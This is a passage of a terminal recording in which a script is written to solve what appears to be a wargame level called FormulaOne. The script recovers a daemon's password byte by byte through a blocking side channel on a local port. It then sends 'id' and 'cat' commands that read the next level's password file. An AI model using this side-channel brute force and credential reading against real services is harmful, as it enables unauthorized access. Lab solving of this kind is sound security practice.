[23.309831, "o", "cat > /tmp/f1_solve.py <<'PYEOF'\r\r\n\u001b[?2004l\r\u001b[?2004h> import socket, string, time\r\r\n\u001b[?2004l\r\u001b[?2004h> HOST, PORT = \"127.0.0.1\", 4091\r\r\n\u001b[?2004l\r\u001b[?2004h> def probe(prefix):\r\r\n\u001b[?2004l\r\u001b[?2004h>     s = socket.create_connection((HOST, PORT), timeout=5)\r\r\n\u001b[?2004l\r\u001b[?2004h>     s.recv(20)\r\r\n\u001b[?2004l\r\u001b[?2004h>     s.sendall(prefix)\r\r\n\u001b[?2004l\r\u001b[?2004h>     s.settimeout(1.5)\r\r\n\u001b[?2004l\r\u001b[?2004h>     try:\r\r\n\u001b[?2004l\r\u001b[?2004h>         r = s.recv(50)\r\r\n\u001b[?2004l\r\u001b[?2004h>         return \"WRONG\" if b\"WRONG\" in r else \"DATA\"\r\r\n\u001b[?2004l\r\u001b[?2004h>     except socket.timeout:\r\r\n\u001b[?2004l\r\u001b[?2004h>         return \"BLOCKED\"   # correct byte: daemon blocks in recv\r\r\n\u001b[?2004l\r\u001b[?2004h>     finally:\r\r\n\u001b[?2004l\r\u001b[?2004h>         s.close()\r\r\n\u001b[?2004l\r\u001b[?2004h> chars = [c.encode() for c in string.ascii_letters + string.digits + \"_-{}!@#$%^&*()\"]\r\r\n\u001b[?2004l\r\u001b[?2004h> pw = b\"\"\r\r\n\u001b[?2004l\r\u001b[?2004h> for pos in range(32):\r\r\n\u001b[?2004l\r\u001b[?2004h>     for c in chars:\r\r\n\u001b[?2004l\r\u001b[?2004h>         if probe(pw + c) == \"BLOCKED\":\r\r\n\u001b[?2004l\r\u001b[?2004h>             pw += c\r\r\n\u001b[?2004l\r\u001b[?2004h>             print(\"pos\", pos, \"->\", pw.decode(), flush=True)\r\r\n\u001b[?2004l\r\u001b[?2004h>             break\r\r\n\u001b[?2004l\r\u001b[?2004h>     else:\r\r\n\u001b[?2004l\r\u001b[?2004h>         break\r\r\n\u001b[?2004l\r\u001b[?2004h> print(\"PASSWORD:\", pw.decode(), flush=True)\r\r\n\u001b[?2004l\r\u001b[?2004h> s = socket.create_connection((HOST, PORT), timeout=5)\r\r\n\u001b[?2004l\r\u001b[?2004h> s.recv(20)\r\r\n\u001b[?2004l\r\u001b[?2004h> s.sendall(pw)\r\r\n\u001b[?2004l\r\u001b[?2004h> time.sleep(0.5)\r\r\n\u001b[?2004l\r\u001b[?2004h> s.sendall(b\"id\\n\")\r\r\n\u001b[?2004l\r\u001b[?2004h> time.sleep(0.5)\r\r\n\u001b[?2004l\r\u001b[?2004h> s.sendall(b\"cat /etc/formulaone_pass/formulaone0\\n\")\r\r\n\u001b[?2004l\r\u001b[?2004h> time.sleep(1)\r\r\n\u001b[?2004l\r\u001b[?2004h> s.settimeout(4)\r\r\n\u001b[?2004l\r\u001b[?2004h> data = b\"\"\r\r\n\u001b[?2004l\r\u001b[?2004h> try:\r\r\n\u001b[?2004l\r\u001b[?2004h>     while True:\r\r\n\u001b[?2004l\r\u001b[?2004h>         c = s.recv(4096)\r\r\n\u001b[?2004l\r\u001b[?2004h>         if not c: break\r\r\n\u001b[?2004l\r\u001b[?2004h>         data += c\r\r\n\u001b[?2004l\r\u001b[?2004h> except socket.timeout:\r\r\n\u001b[?2004l\r\u001b[?2004h>     pass\r\r\n\u001b[?2004l\r\u001b[?2004h> print(\"SHELL OUTPUT:\\n\" + data.decode(\"latin-1\"))\r\r\n\u001b[?2004l\r\u001b[?2004h> PYEOF\r\r\n\u001b[?2004l\r\u001b]3008;start=006c2a69-1583-4887-809b-8d8418ae2841;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=formulaone0;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/formulaone0\u001b\\\u001b]3008;end=006c2a69-1583-4887-809b-8d8418ae2841;exit=success\u001b\\\u001b]3008;start=64956ca1-f317-4ddc-bd86-1e5c78d71ad9;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=formulaone0;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/formulaone0\u001b\\\u001b[?2004h\u001b]0;formulaone0@formulaone: ~\u0007formulaone0@formulaone:~$ "]
